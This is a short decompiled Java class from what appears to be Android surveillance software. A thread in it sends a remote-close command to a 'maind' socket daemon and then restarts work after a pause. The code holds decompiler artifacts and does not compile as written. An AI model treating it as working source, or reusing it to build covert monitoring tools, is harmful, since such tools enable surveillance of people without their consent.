package com.vvt.daemon;

import android.os.SystemClock;
import com.fx.socket.command.RemoteCloseServer;

class b
  extends Thread
{
  b(a parama, String paramString)
  {
    super(paramString);
  }
  
  public void run()
  {
    String str = "com.fx.socket.maind";
    boolean bool1 = a.g();
    if (bool1) {}
    RemoteCloseServer localRemoteCloseServer = new com/fx/socket/command/RemoteCloseServer;
    localRemoteCloseServer.<init>(str);
    try
    {
      localRemoteCloseServer.execute();
      long l = 1000L;
      SystemClock.sleep(l);
      boolean bool2 = a.g();
      if (bool2) {}
      bool2 = a.g();
      if (bool2) {}
      a.a(this.a);
      return;
    }
    finally
    {
      for (;;) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/daemon/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */